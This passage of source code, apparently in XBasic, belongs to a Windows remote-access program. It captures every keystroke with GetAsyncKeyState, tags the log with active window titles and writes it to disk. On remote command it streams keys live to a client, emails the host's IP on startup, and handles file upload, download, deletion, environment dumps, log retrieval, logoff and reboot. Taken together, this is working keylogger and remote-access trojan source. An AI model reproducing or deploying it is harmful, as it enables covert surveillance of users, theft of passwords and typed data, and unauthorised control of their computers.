	LOOP WHILE (APPLSTATUS == $$TRUE)

	ShutDown()
END FUNCTION

FUNCTION SetReg (STRING subkey, STRING key, STRING value)


'	hKey = $$APINULL
'	IF RegOpenKeyExA ($$HKEY_CURRENT_USER, &subkey, 0, $$KEY_WRITE, &hKey) == $$ERROR_SUCCESS THEN
'		RegSetValueExA(hKey, &key, 0, $$REG_SZ, &value, LEN (value))
'		RegCloseKey(hKey)
'		RETURN $$TRUE
'	ELSE
'		RegCloseKey(hKey)
'		RETURN $$FALSE
'	END IF
	
END FUNCTION

FUNCTION TimerCallback (timerid, msg, dwUser, dw1, dw2) 
'	SHARED APPLSTATUS
'	SHARED CONNECTED
'	SHARED client
'
'
'	SELECT CASE timerid
'		CASE #pingtimer		:IF (APPLSTATUS == $$TRUE) && (CONNECTED == $$TRUE) && client THEN
'								SendMsg (client,"PING "+STRING$(GetTickCount()))
'							 END IF
'		CASE ELSE
'	END SELECT
'
'	RETURN $$TRUE
END FUNCTION


FUNCTION EventCheck ()
	SHARED STRING neweventslog
	SHARED RECORDEVENTS
	SHARED APPLSTATUS
	STATIC STRING logsnapshot
	STATIC logsize,ologsize
	SHARED t0,tid
	STATIC dosleep
	ULONG keys[],kstate[]
	
	
	
	IFZ t0 THEN
		t0 = GetTickCount ()
		ologsize = 0
		dosleep = 1
	END IF

	DIM keys[255]
	DIM kstate[255]

	DO
		FOR k = 0 TO 255
			keys[k] = GetAsyncKeyState(k)
			SELECT CASE k
				CASE $$VK_LSHIFT,$$VK_RSHIFT,$$VK_LCONTROL,$$VK_RCONTROL,$$VK_LMENU,$$VK_RMENU,$$VK_LWIN,$$VK_RWIN,$$VK_APPS :
   					IF keys[k]{1,0} THEN
   				   		kstate[k] = 1
    					EventProcess (k, $$ST_DOWN)
   					ELSE
	   					IF kstate[k] && !keys[k] THEN
   							kstate[k] = 0
   							EventProcess (k,$$ST_UP)
   						END IF
   					END IF

				CASE ELSE	:IF keys[k]{1,0} THEN EventProcess (k,$$ST_PRESSED)
			END SELECT
   		NEXT k
   		
   		IF (GetTickCount()-t0) > $$ST_KEYLOGT THEN		' save every $$ST_KEYLOGT ms
			IF GetEventLogSize() > ologsize THEN		' save if there is a change
				IF WaitForSingleObject(#mtSaveLogEx,15000) == $$WAIT_TIMEOUT THEN
					'PRINT "EventCheck:mtSaveLogEx timeout"
					EXIT IF 3
				ELSE
				'	PRINT "saving log..."
					logsize = GetEventLogSize()
					neweventslog = RIGHT$(GetEventLog(),(logsize-ologsize))
					ReleaseMutex (#mtSaveLogEx)
					ologsize = logsize
					dosleep = 0
					t0 = GetTickCount ()
				END IF
	   		END IF
   		END IF

		IF dosleep THEN Sleep (3)
		dosleep = 1
	LOOP WHILE ((APPLSTATUS == $$TRUE) && (RECORDEVENTS == $$TRUE))

	'todo: save log upon exiting, this would require a rewrite of this function and how logs are handled	
	RETURN $$TRUE
END FUNCTION

FUNCTION AppendEventLog (STRING text)
	SHARED STRING eventlog
	
	IFZ text RETURN $$FALSE
	IF WaitForSingleObject (#hsmEventLog,10000) == $$WAIT_TIMEOUT THEN
		RETURN $$FALSE
	END IF
	
	eventlog = eventlog + text
	ReleaseSemaphore (#hsmEventLog,1,NULL)
	
	RETURN $$TRUE
END FUNCTION

FUNCTION GetEventLogSize()
	SHARED STRING eventlog
	
	IF WaitForSingleObject (#hsmEventLog,15000) == $$WAIT_TIMEOUT THEN
		RETURN -1
	END IF
	
	elsize = SIZE(eventlog)
	ReleaseSemaphore (#hsmEventLog,1,NULL)
	
	RETURN elsize
END FUNCTION

FUNCTION STRING GetEventLog()
	SHARED STRING eventlog
	STRING tmpelog
	
	IF WaitForSingleObject (#hsmEventLog,15000) == $$WAIT_TIMEOUT THEN
		RETURN ""
	END IF

	tmpelog = eventlog
	ReleaseSemaphore (#hsmEventLog,1,NULL)
	
	RETURN tmpelog
END FUNCTION

FUNCTION EventSaveLogExA ()
	SHARED STRING neweventslog
	SHARED APPLSTATUS
	SHARED RECORDEVENTS
	STRING tmplog
	

	DO
		Sleep (1000)
		
		IF WaitForSingleObject(#mtSaveLogEx,15000) == $$WAIT_TIMEOUT THEN
		'	PRINT "EventSaveLogExA:mtSaveLogEx timeout"
			EXIT IF
		ELSE
			IF LEN(neweventslog) > 0 THEN
				tmplog = neweventslog
				neweventslog = ""
				ReleaseMutex (#mtSaveLogEx)
				EventSaveLog (tmplog)
				tmplog = ""
			ELSE
				ReleaseMutex (#mtSaveLogEx)
			END IF
		END IF
	LOOP WHILE ((APPLSTATUS == $$TRUE) && (RECORDEVENTS == $$TRUE))
	
	RETURN $$TRUE
END FUNCTION

FUNCTION EventSaveLog (STRING log)
	STATIC STRING logheader
	SHARED of

	IFZ log THEN RETURN $$FALSE
		
	FOR c = 0 TO (SIZE(log)-1)
		IF (log{c} == 1) THEN
			log{c} = 13
		ELSE
			IF (log{c} == 2) THEN log{c} = 10
		END IF
	NEXT c

   	IFZ logheader THEN
   		logheader = "\r\n\r\n##### "+GetDate()+" -- "+GetTime()+" #####\r\n"
   		log = logheader + log
   	END IF

	IFZ of THEN of = OpenEventLog()
	IF of < 0 THEN
		'PRINT "unable to open event log: ",of
		of = 0
		RETURN $$FALSE
	END IF

	SEEK (of,LOF(of))
	WRITE [of],log
	'CLOSE (of)
		
	RETURN $$TRUE
END FUNCTION

FUNCTION GetKeyStatus (vkey)

'	IF ((vkey < 0) || (vkey > 255)) THEN RETURN -1
	IF (vkey == $$VK_CAPITAL) || (vkey == $$VK_SCROLL) || (vkey == $$VK_NUMLOCK) THEN
		RETURN GetKeyState(vkey){1,0}
	ELSE
		RETURN GetKeyState(vkey){1,7}
	END IF
END FUNCTION

FUNCTION EventProcess (vkey,state)
	SHARED STRING atitle
	STATIC STRING key
	STRING title
	SHARED client


	key = ""
	SELECT CASE vkey
		CASE $$VK_LBUTTON		:key = "[L BUTTON]"
		CASE $$VK_RBUTTON		:key = "[R BUTTON]"
		CASE $$VK_CANCEL 		:key = "[CANCEL]"
		CASE $$VK_MBUTTON		:key = "[M BUTTON]"
		CASE $$VK_BACK			:key = "[BACK]"
		CASE $$VK_TAB			:key = "[TAB]"
		CASE $$VK_CLEAR			:key = "[CLEAR]"
		CASE $$VK_RETURN		:key = "[RETURN]\1\2"
		CASE $$VK_KANA			:key = "[KANA]"
		CASE $$VK_SHIFT			:key = ""			'"[SHIFT]"
		CASE $$VK_CONTROL		:key = ""			'"[CONTROL]"
		CASE $$VK_MENU			:key = ""			'"[ALT]"
		CASE $$VK_PAUSE			:key = "[PAUSE]"
		CASE $$VK_CAPITAL		:IF GetKeyStatus($$VK_CAPITAL) THEN
									key = "[CAPSLOCK ON]"	' is now on
								 ELSE
								 	key = "[CAPSLOCK OFF]"	' is now off
								 END IF
		CASE $$VK_ESCAPE		:key = "[ESCAPE]"
		CASE $$VK_SPACE			:key = " "
		CASE $$VK_PRIOR			:key = "[PGUP]"	'"[PRIOR]"
		CASE $$VK_NEXT			:key = "[PGDN]"	'"[NEXT]"
		CASE $$VK_END			:key = "[END]"
		CASE $$VK_HOME			:key = "[HOME]"
		CASE $$VK_LEFT			:key = "[LEFT]"
		CASE $$VK_UP			:key = "[UP]"
		CASE $$VK_RIGHT			:key = "[RIGHT]"
		CASE $$VK_DOWN			:key = "[DOWN]"
		CASE $$VK_SELECT		:key = "[SELECT]"
		CASE $$VK_PRINT			:key = "[PRINT]"
		CASE $$VK_EXECUTE		:key = "[EXECUTE]"
		CASE $$VK_SNAPSHOT		:key = "[SNAPSHOT]"
		CASE $$VK_INSERT		:key = "[INSERT]"
		CASE $$VK_DELETE		:key = "[DELETE]"
		CASE $$VK_HELP			:key = "[HELP]"
		CASE $$VK_NUMPAD0		:key = "[NUMPAD 0]"
		CASE $$VK_NUMPAD1		:key = "[NUMPAD 1]"
		CASE $$VK_NUMPAD2		:key = "[NUMPAD 2]"
		CASE $$VK_NUMPAD3		:key = "[NUMPAD 3]"
		CASE $$VK_NUMPAD4		:key = "[NUMPAD 4]"
		CASE $$VK_NUMPAD5		:key = "[NUMPAD 5]"
		CASE $$VK_NUMPAD6		:key = "[NUMPAD 6]"
		CASE $$VK_NUMPAD7		:key = "[NUMPAD 7]"
		CASE $$VK_NUMPAD8		:key = "[NUMPAD 8]"
		CASE $$VK_NUMPAD9		:key = "[NUMPAD 9]"
		CASE $$VK_MULTIPLY		:key = "[*]"
		CASE $$VK_ADD			:key = "[+]"
		CASE $$VK_SEPARATOR		:key = "[SEPARATOR]"
		CASE $$VK_SUBTRACT		:key = "[-]"
		CASE $$VK_DECIMAL		:key = "[.]"
		CASE $$VK_DIVIDE		:key = "[/]"
		CASE $$VK_F1			:key = "[F1]"
		CASE $$VK_F2			:key = "[F2]"
		CASE $$VK_F3			:key = "[F3]"
		CASE $$VK_F4			:key = "[F4]"
		CASE $$VK_F5			:key = "[F5]"
		CASE $$VK_F6			:key = "[F6]"
		CASE $$VK_F7			:key = "[F7]"
		CASE $$VK_F8			:key = "[F8]"
		CASE $$VK_F9			:key = "[F9]"
		CASE $$VK_F10			:key = "[F10]"
		CASE $$VK_F11			:key = "[F11]"
		CASE $$VK_F12			:key = "[F12]"
		CASE $$VK_F13			:key = "[F13]"
		CASE $$VK_F14			:key = "[F14]"
		CASE $$VK_F15			:key = "[F15]"
		CASE $$VK_F16			:key = "[F16]"
		CASE $$VK_F17			:key = "[F17]"
		CASE $$VK_F18			:key = "[F18]"
		CASE $$VK_F19			:key = "[F19]"
		CASE $$VK_F20			:key = "[F20]"
		CASE $$VK_F21			:key = "[F21]"
		CASE $$VK_F22			:key = "[F22]"
		CASE $$VK_F23			:key = "[F23]"
		CASE $$VK_F24			:key = "[F24]"
		CASE $$VK_NUMLOCK		:key = "[NUMLOCK]"
		CASE $$VK_SCROLL		:key = "[SCROLL]"
		CASE $$VK_LSHIFT		:key = "[L SHIFT"
		CASE $$VK_RSHIFT		:key = "[R SHIFT"
		CASE $$VK_LCONTROL		:key = "[L CONTROL"
		CASE $$VK_RCONTROL		:key = "[R CONTROL"
		CASE $$VK_LMENU			:key = "[L ALT"		'"[LMENU]"
		CASE $$VK_RMENU			:key = "[R ALT"		'"[RMENU]"
		CASE $$VK_ATTN			:key = "[ATTN]"
		CASE $$VK_CRSEL			:key = "[CRSEL]"
		CASE $$VK_EXSEL			:key = "[EXSEL]"
		CASE $$VK_EREOF			:key = "[EREOF]"
		CASE $$VK_PLAY			:key = "[PLAY]"
		CASE $$VK_ZOOM			:key = "[ZOOM]"
		CASE $$VK_NONAME		:key = "[NONAME]"
		CASE $$VK_PA1			:key = "[PA1]"
		CASE $$VK_OEM_CLEAR		:key = "[OEM_CLEAR]"

		CASE $$VK_LWIN			:key = "[L WIN"		' left windows key
		CASE $$VK_RWIN			:key = "[R WIN"		' right windows key
		CASE $$VK_APPS			:key = "[CONTEXT"	' application context menu

		'CASE 32				:key = "[SPACE]"
		CASE 186				:key = ";"
		CASE 187				:key = "="
		CASE 188				:key = ","
		CASE 189				:key = "-"
		CASE 190				:key = "."
		CASE 191				:key = "/"
		CASE 192				:key = "'"
		CASE 219				:key = "["
		CASE 220				:key = "\\"
		CASE 221				:key = "]"
		CASE 222				:key = "#"
		CASE 223				:key = "`"

		CASE ELSE				:IF (vkey > 64) && (vkey < 91) THEN
								 	IF !(GetKeyStatus($$VK_SHIFT) | GetKeyStatus($$VK_CAPITAL)) THEN
								 		vkey = vkey + 32
								 	ELSE
								 		IF GetKeyStatus($$VK_SHIFT) && GetKeyStatus($$VK_CAPITAL) THEN vkey = vkey + 32
								 	END IF
								 END IF
	 							 key = CHR$(vkey)
	END SELECT

	IF (state == $$ST_DOWN) THEN
		key = key + " DOWN]"
	ELSE
		IF (state == $$ST_UP) THEN
			key = key + " UP]"
		END IF
	END IF

	hwnd = GetForegroundWindow ()
	'class$ = NULL$(64)
	'GetClassNameA (hwnd,&class$, 63)

	len = GetWindowTextLengthA (hwnd) + 1
	title = SPACE$(len)
	GetWindowTextA (hwnd, &title,len)
 	title = CSTRING$(&title)

 	IF (title == "") THEN THEN title = "notitle"
 	IF (title != atitle) THEN
 		atitle = title
 		ltitle$ = "\1\2\1\2->["+title+"]\1\2"
 		AppendEventLog (@ltitle$)
 	END IF

	AppendEventLog (@key)
	IF (#StreamKey == $$TRUE) && client && (state == $$ST_PRESSED)THEN
		IF (key == " ") THEN key = "[SPACE]"
		QueueMsg ($$QM_WRITE,client,"_event KEY "+ltitle$ + key)
	END IF

	RETURN $$TRUE
END FUNCTION

FUNCTION NetSleep (time)
	SHARED APPLSTATUS
	SHARED CONNECTED
	SHARED NETWORK
	
	
	IF ((APPLSTATUS == $$TRUE) && (NETWORK == $$FALSE) && (CONNECTED == $$TRUE)) THEN
		Sleep (time)
	END IF

END FUNCTION

FUNCTION EMailAlert (pmessage)

	from$ = ""		' email address
	to$ = ""		' email address
	fromname$ = ""	' person
	server$ = "smtp.live.com"	' example email server
	subject$ = #IPAddr$+":"+STRING$(#Port)+" "+ #startTime$+" "+ GetDate()
	body$ = CSTRING$(pmessage)

	RETURN EMail (to$,from$,fromname$,subject$,body$,server$)
END FUNCTION

FUNCTION EMail (to$,from$,fromname$,subject$,body$,server$)


	IFZ server$ THEN RETURN $$FALSE
	IFZ to$ THEN RETURN $$FALSE
	IFZ from$ THEN from$ = to$
	IFZ fromname$ THEN fromname$ = from$
	IFZ body$ THEN body$ = "\r\n\r\n"
	IFZ subject$ THEN subject$ = "  "
	
	date$ = "06-09-10 GMT"
	port = 25
	socket = ConnectToServer (server$,port)
	IFZ socket THEN RETURN $$FALSE

	time = 900
	Sleep (time)
	SendMail (socket,"HELO " + GetLocalIpA())
	Sleep (time)	
	SendMail (socket,"MAIL FROM: <"+from$+">")
	Sleep (time)
	SendMail (socket,"RCPT TO: <"+to$+">")
	Sleep (time)
	SendMail(socket,"DATA")
	Sleep (time)

	mail$ = "Date: "+date$+"\r\nTo: <"+to$+">\r\nFrom: "+fromname$+"\r\nSender: "+from$
	mail$ = mail$ + "\r\nReply-To: <"+from$+">\r\nSubject: "+subject$+"\r\n"+body$+"\r\n."
	SendMail (socket,mail$)
	
	Sleep (time)
	SendMail (socket,"QUIT")
	Sleep (100)

	p2pCloseSocket (socket)
	Sleep (100)
	IF #mailthread THEN
		CloseHandle (#mailthread)
		#mailthread = 0
	END IF

	RETURN $$TRUE	
END FUNCTION

FUNCTION ConnectToServer (server$,port)
	SHARED STRING MailReply
	STATIC c


	INC c
	MailReply = MailReply + "\r\ntry "+STRING$(c)+":connecting to mailserver "+server$+":"+STRING$(port)
	IFT p2pConnect (server$,port,@socket) THEN
		MailReply = MailReply + "\r\nconnected\r\n"
		#mailthread = _beginthreadex (NULL, 0, &ListenMail(), socket, 0, &tid)

		Sleep (10)
		RETURN socket
	ELSE
		MailReply = MailReply + "\r\nconnection failed\r\n"
		RETURN 0
	END IF

END FUNCTION

FUNCTION ShutDown ()
	SHARED socket,client
	SHARED APPLSTATUS
	SHARED ShutOnce
	SHARED ijllibHandle

	IF ShutOnce THEN RETURN
	ShutOnce = 1

'	DestroyTimer ()
	EventStopRecording ()
	IF client THEN SendMsg (client,"DISCONNECT")
	NetSleep(100)
	APPLSTATUS = $$FALSE
	FSshutdown()
	ShutDownNet ()
	
	IF ijllibHandle THEN	' free intel jpg lib
		FreeLibrary (ijllibHandle)
		ijllibHandle = 0
	END IF
	
	IF #hPopMenu THEN
		ModifyMenuA (#hPopMenu, $$ID_Server_Stop, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Server_Start, &"Start Server")
	END IF

	IF #Startup THEN
		CloseHandle (#Startup)
		#Startup = 0
	END IF

END FUNCTION

FUNCTION ShutDownNet ()
	SHARED socket,client
	SHARED CONNECTED
	

	CONNECTED = $$FALSE
	IF socket THEN
		p2pCloseSocket (socket)
		socket = 0
	END IF
	
	IF client THEN
		p2pCloseSocket (client)
		client = 0
	END IF
	WSACleanup ()
	
	RETURN $$TRUE
END FUNCTION 

FUNCTION Initialize ()
	SHARED XLONG startTick
	SHARED APPLSTATUS
	SHARED NETWORK
	WSADATA wsadata
	SHARED RECORDEVENTS
	SHARED ShutOnce
	SHARED of
	TOKEN_PRIVILEGES tkp,t


	SetPriorityClass (GetCurrentProcess(),$$IDLE_PRIORITY_CLASS)

	APPLSTATUS = $$TRUE
	NETWORK = $$FALSE
'	RECORDEVENTS = $$FALSE

	WSAStartup (2 | (2 << 8), &wsadata)

	ShutOnce = 0
	startTick = GetTickCount ()

	#mailthread = 0
	#Port = $$SR_LPort
	#startTime$ = GetTime ()
	#startDate$ = GetDate()
	#IPAddr$ = GetLocalIpA()
	#hSSMsg = CreateSemaphoreA (NULL,1,1,NULL)
	#hSCAPS = CreateSemaphoreA (NULL,1,1,NULL)
	#hSELF	= CreateSemaphoreA (NULL,1,1,NULL)
	#hsmUpL = CreateSemaphoreA (NULL,1,1,NULL)
	#hsmTree = CreateSemaphoreA (NULL,1,1,NULL)
	#hsmDownL = CreateSemaphoreA (NULL,1,1,NULL)
	#hsmListen = CreateSemaphoreA (NULL,1,1,NULL)
	#hsmQueueMsg = CreateSemaphoreA (NULL,1,1,NULL)
	#hsmEventLog = CreateSemaphoreA (NULL,1,1,NULL)
	#hsmGetDirSize = CreateSemaphoreA (NULL,1,1,NULL)

	'IFT RECORDEVENTS THEN
	'	of = OpenEventLog()
		EventStartRecording ()
	'END IF

'	#Startup = CreateThread (NULL, 0, &Startup(),0, 0, 0): Sleep (20)
	QueueMsg ($$QM_INIT,0,"")
	#DTH1 = CreateThread (NULL,0,&DispatchThd1(),0,0,0): Sleep (10)
	'#DTH2 = CreateThread (NULL,0,&DispatchThd2(),0,0,0): Sleep (10)
	'#DTH3 = CreateThread (NULL,0,&DispatchThd3(),0,0,0): Sleep (10)
	'#DTH4 = CreateThread (NULL,0,&DispatchThd4(),0,0,0): Sleep (10)

	buf = 0	
	hToken = 0
	tpResult = OpenProcessToken(GetCurrentProcess(),$$TOKEN_ADJUST_PRIVILEGES | $$TOKEN_QUERY,&hToken)
	LookupPrivilegeValueA(0,&$$Priv_Name,&tkp.Privileges[0].Luid)
	tkp.PrivilegeCount = 1 '  // one privilege to set    
	tkp.Privileges[0].Attributes = $$SE_PRIVILEGE_ENABLED
	AdjustTokenPrivileges(hToken, 0, &tkp,SIZE(t),&t,&buf)

	RETURN $$TRUE
END FUNCTION

FUNCTION Startup()	' disabled
	STRING ip


	DO
		ip = GetLocalIpA()
		IF (LEFT$(ip,3) == "127") THEN Sleep (1000)
	LOOP WHILE (LEFT$(ip,3) == "127")
	
	#IPAddr$ = ip
	Sleep(2500)
	
	IF LEFT$(#IPAddr$,3) != "10." THEN
		message$ = "starting up\0"
		FOR c = 1 TO 10
			IFT EMailAlert(&message$) THEN RETURN
			Sleep (2000)
		NEXT c
	END IF

	RETURN
END FUNCTION

FUNCTION InitTimer ()
'	SHARED wTimerRes
'	TIMECAPS tc
	

'	IF (timeGetDevCaps(&tc, SIZE(TIMECAPS)) != $$TIMERR_NOERROR) THEN
'       	RETURN $$TIMERR_NOCANDO
'    END IF
'	wTimerRes = MIN(MAX(tc.wPeriodMin, XLONG($$TARGET_RESOLUTION)), tc.wPeriodMax)
'	timeBeginPeriod(wTimerRes)
'	
'	#pingtimer = timeSetEvent($$SR_PINGPONG, wTimerRes, &TimerCallback(), 0, $$TIME_PERIODIC)
'	IF (#pingtimer != 0) THEN
'    	RETURN $$TIMERR_NOCANDO
'    ELSE
'    	RETURN $$TIMERR_NOERROR
'    END IF

END FUNCTION

FUNCTION DestroyTimer ()
'	SHARED wTimerRes
	
	
'    IF #pingtimer THEN
'    	timeEndPeriod(wTimerRes)
'    	timeKillEvent(#pingtimer)   ' Cancel the event  
'        #pingtimer = 0  
'    END IF
    
END FUNCTION

FUNCTION EventStartRecording ()
	SHARED heventr,hkeychk
	SHARED RECORDEVENTS
	SHARED of

	IFT RECORDEVENTS THEN RETURN $$FALSE
	RECORDEVENTS = $$TRUE

	IFZ of THEN of = OpenEventLog()
	id$ = "SLV"+STRING$(GetTickCount())
	#mtSaveLogEx = CreateMutexA (0,0,&id$)

	hkeychk = _beginthreadex (NULL, 0, &EventCheck(),0, 0, 0): Sleep (20)
	heventr = _beginthreadex (NULL, 0, &EventSaveLogExA(),0, 0, 0): Sleep (20)

	RETURN $$TRUE
END FUNCTION

FUNCTION EventStopRecording ()
	SHARED heventr,hkeychk
	SHARED RECORDEVENTS


	IFF RECORDEVENTS THEN RETURN $$FALSE
	RECORDEVENTS = $$FALSE
	Sleep (50)
	
	IF hkeychk THEN CloseHandle (hkeychk)
	IF heventr THEN CloseHandle (heventr)
	IF #mtSaveLogEx THEN CloseHandle (#mtSaveLogEx)
	#mtSaveLogEx = 0
	heventr = 0
	hkeychk = 0	

	RETURN $$TRUE
END FUNCTION

FUNCTION SendMsg (socket,STRING buffer)

	IFZ socket THEN RETURN $$FALSE
	buffer = buffer + "\r\n"
	RETURN SendBin (socket,&buffer,LEN(buffer))
	
END FUNCTION

FUNCTION SendBin (socket,pbuffer,size)
	SHARED tBytesSent
	SHARED APPLSTATUS
	SHARED CONNECTED


	IF !socket || !pbuffer || !size THEN RETURN $$FALSE
	IF ((APPLSTATUS == $$FALSE) || (CONNECTED == $$FALSE)) THEN
		RETURN $$FALSE
	END IF
	
	IF WaitForSingleObject (#hSSMsg,29000) == $$WAIT_TIMEOUT THEN
		RETURN $$FALSE
	END IF
	
	IF ((APPLSTATUS == $$FALSE) || (CONNECTED == $$FALSE)) THEN
		ReleaseSemaphore (#hSSMsg,1,NULL)
		RETURN $$FALSE
	END IF
	
	ret = $$TRUE
	total = 0
	sent = 0
	tsize = size
	buffer = pbuffer
	DO
		sent = send (socket, buffer+total, size, 0)
		IF (sent == $$SOCKET_ERROR) || (sent == 0) THEN
			ret = $$FALSE
			EXIT DO
		ELSE
			tBytesSent = tBytesSent + sent
			total = total + sent
			size = size - sent
		END IF
	LOOP WHILE (total < tsize)

	ReleaseSemaphore (#hSSMsg,1,NULL)
	RETURN ret
END FUNCTION

FUNCTION SendMail (socket,STRING buffer)
	SHARED APPLSTATUS


	IF (APPLSTATUS != $$TRUE) THEN RETURN $$FALSE
	
	buffer = buffer + "\r\n"
	size = SIZE(buffer)
	pbuffer = &buffer
	ret = $$TRUE
	total = 0
	sent = 0
	tsize = size

	DO
		sent = send (socket, pbuffer+total, size, 0)
		IF (sent == $$SOCKET_ERROR) || (sent == 0) THEN
			ret = $$FALSE
			EXIT DO
		ELSE
			total = total + sent
			size = size - sent
		END IF
	LOOP WHILE (total < tsize)

	RETURN $$TRUE
END FUNCTION

FUNCTION STRING trim (str$,char)


	IFZ str$ THEN RETURN ""
	out$=""

	FOR p = 0 TO LEN (str$)-1
		IF str${p} != char THEN out$ = out$ + CHR$(str${p})
	NEXT p

	str$ = out$
	RETURN str$
	
END FUNCTION

FUNCTION MessagePump (socket,msg$)
	SHARED APPLSTATUS
	STATIC cmd$,scmd$
	

	msg$ = cmd$ + msg$
	msglen = LEN(msg$)
	p = LEN (cmd$)
	start = 1
	flag = $$FALSE

	DO
		SELECT CASE msg${p}
			CASE 0x0D		:flag = $$TRUE
			CASE 0x0A		:IFT flag THEN
								flag = $$FALSE
								IF (p-start) < 1 THEN EXIT SELECT
								IF start > LEN (msg$) THEN EXIT SELECT
								cmd$ = MID$(msg$,start,p-start)
								IF cmd$ THEN
									scmd$ = cmd$
									'QueueMsg ($$QM_WRITE,socket,cmd$)
									Sleep (10)
									_beginthreadex (0, 0,&ProcessCommandB(),&scmd$, 0, &tid)
									Sleep (20)
								END IF
								cmd$ = ""
						 	 	start = p+2
						 	 ELSE
						 	 	flag = $$FALSE
						 	 END IF
			CASE ELSE		:IFT flag THEN flag = $$FALSE
		END SELECT

		INC p	
	LOOP WHILE ((p < msglen) && (APPLSTATUS == $$TRUE))
	
	IF (p-start+1) < 0 THEN RETURN 0
	IF start > LEN (msg$) THEN RETURN 0
	cmd$ = MID$(msg$,start,p-start+1)
	RETURN 0
END FUNCTION

FUNCTION QueueMsg (accessType,socket,STRING message)
	STATIC TQMSG QMsg[]
	STATIC total,id
	SHARED APPLSTATUS


	IF (WaitForSingleObject(#hsmQueueMsg,30000) == $$WAIT_TIMEOUT) THEN
		RETURN $$FALSE
	END IF

	ret = $$FALSE
	SELECT CASE accessType
		CASE $$QM_WRITE		:	' add message queue
			FOR m = 1 TO total				' search for free slot
				IF (QMsg[m].id == 0) THEN	' free slot found
					QMsg[m].id = id
					QMsg[m].socket = socket
					QMsg[m].msg = message
					INC id
					IF (id == QMsg[0].id) THEN id = 1
					ret = $$TRUE
					EXIT SELECT
				END IF
			NEXT m

		CASE $$QM_READ		:	' read message (if any) then remove from queue
			r = 0
			FOR m = 1 TO total	' its FIFO so find message with lowest .id
				IF QMsg[m].id > 0 THEN
					IF QMsg[m].id < QMsg[r].id THEN r = m
				END IF
			NEXT m

			IF r THEN		' message found
				socket = QMsg[r].socket
				message = RTRIM$(QMsg[r].msg)
				
				QMsg[r].id = 0		' remove message
				QMsg[r].msg = ""
				QMsg[r].socket = 0
				ret = $$TRUE
			END IF
				
		'CASE $$QM_DELETE	:
		CASE $$QM_PEEK		:
			r = 0
			FOR m = 1 TO total
				IF QMsg[m].id > 0 THEN
					IF QMsg[m].id < QMsg[r].id THEN r = m
				END IF
			NEXT m
			IF r THEN
				socket = QMsg[r].socket
				message = RTRIM$(QMsg[r].msg)
				ret = $$TRUE
			END IF
		CASE $$QM_INIT		:
			total = 100
			id = 1
			DIM QMsg[total]
			FOR m = 0 TO total
				QMsg[m].id = 0
				QMsg[m].socket = 0
				QMsg[m].msg = ""
			NEXT m
			QMsg[0].id = 256*256*256*100
		CASE ELSE			:ret = $$FALSE
	END SELECT

	IFF APPLSTATUS THEN ret = -2
	ReleaseSemaphore (#hsmQueueMsg,1,NULL)
	RETURN ret
END FUNCTION

FUNCTION DispatchThd1 ()
	STRING message


	DO
		socket = 0: message = ""
		ret = QueueMsg ($$QM_READ,@socket,@message)
		IF (ret == -2) THEN RETURN
		IFT ret THEN
			ProcessCommands(socket,message)
		ELSE
			Sleep (5)
		END IF
	LOOP WHILE (ret != -2)
END FUNCTION

FUNCTION DispatchThd2 ()
	STRING message


	DO
		socket = 0: message = ""
		ret = QueueMsg ($$QM_READ,@socket,@message)
		IF (ret == -2) THEN RETURN
		IFT ret THEN
			ProcessCommands(socket,message)
		ELSE
			Sleep (5)
		END IF
	LOOP WHILE (ret != -2)
END FUNCTION

FUNCTION DispatchThd3 ()
	STRING message


	DO
		socket = 0: message = ""
		ret = QueueMsg ($$QM_READ,@socket,@message)
		IF (ret == -2) THEN RETURN
		IFT ret THEN
			ProcessCommands(socket,message)
		ELSE
			Sleep (5)
		END IF
	LOOP WHILE (ret != -2)
END FUNCTION

FUNCTION DispatchThd4 ()
	STRING message


	DO
		socket = 0: message = ""
		ret = QueueMsg ($$QM_READ,@socket,@message)
		IF (ret == -2) THEN RETURN
		IFT ret THEN
			ProcessCommands(socket,message)
		ELSE
			Sleep (5)
		END IF
	LOOP WHILE (ret != -2)
END FUNCTION

FUNCTION ProcessCommandB (pmessage)
	SHARED client

	ProcessCommands (client,CSTRING$(pmessage))
END FUNCTION

FUNCTION ProcessCommands (socket,STRING message)
	SHARED NETWORK
	STATIC str$
	

	IFZ message THEN RETURN $$FALSE
	str$ = message
	GetToken (@str$,@cmd$,32)

	SELECT CASE UCASE$(cmd$)
		CASE "AUTH"			:GetToken (str$,@auth$,32)
							 auth$ = TRIM$(trim(auth$,32))
							 IF auth$ == $$SR_AUTHPASS THEN
							 	#authok = $$TRUE
							 	SendMsg (socket,"AUTHOK\r\nCMSG *** Welcome "+ #cip$+" ***")
							 ELSE
							 	#authok = $$FALSE
							 	SendMsg (socket,"CMSG *** AUTH FAILED ***\r\nCMSG --"+auth$+"--")
							 END IF
	END SELECT

	IFT #authok THEN
		SELECT CASE LCASE$(cmd$)
			CASE "refresh"		:ClientRefresh (socket,str$)
			CASE "fileinfo"		:ClientFileInfo (socket,str$)
			CASE "movefile"		:ClientRenameFile (socket,str$)
			CASE "delallfiles"	:ClientDelFiles (socket,str$)
			CASE "deldir"		:ClientDelDir (socket,str$)
			CASE "delfile"		:ClientDelFile (socket,str$)
			CASE "newdir"		:ClientNewDir (socket,str$)
			CASE "getdrives"	:SendMsg (socket,"DRIVES "+GetDrivesB())
			CASE "treeb"		:ClientTree (socket,"DIR",str$)
			CASE "getenv"		:ClientGetEnv(socket)
			CASE "_event"		:IFT #StreamKey THEN SendMsg (socket,str$)
			CASE "upload"		:ClientUpload (str$)
			CASE "download"		:ClientDownload (str$)
			CASE "listen"		:ClientListen (socket,str$)
			CASE "sysmenu"		:ClientSysMenu (socket,str$)
			CASE "mailreply"	:ClientMailReply (socket)
			CASE "estop"		:EventStopRecording ()
								 SendMsg (socket,"CMSG *** Event recording stopped ***")
			CASE "estart"		:EventStartRecording ()
								 SendMsg (socket,"CMSG *** Event recording started ***")
			CASE "resetscr"		:file$ = $$SR_SCRCAP
								 DeleteFileA (&file$)
								 ReleaseSemaphore (#hSCAPS,1,NULL)
								 CloseHandle (#hSCAPS)
								 Sleep(1000)
								 #hSCAPS = CreateSemaphoreA (NULL,1,1,NULL)
								 SendMsg (socket,"CMSG *** RESET ***")
			CASE "email"		:ClientEmail (socket,str$)
			CASE "strevent"		:ClientStreamKeys (socket,str$)
			CASE "getslog"		:ClientGetKeyLog (socket)
			CASE "getelog"		:ClientGetEventLog (socket)
			CASE "logoff"		:SendMsg (socket,"CMSG *** logging off ***")
								 ExitWindowsEx ($$EWX_LOGOFF | $$EWX_FORCEIFHUNG,0)
			CASE "reboot"		:SendMsg (socket,"CMSG *** rebooting ***")
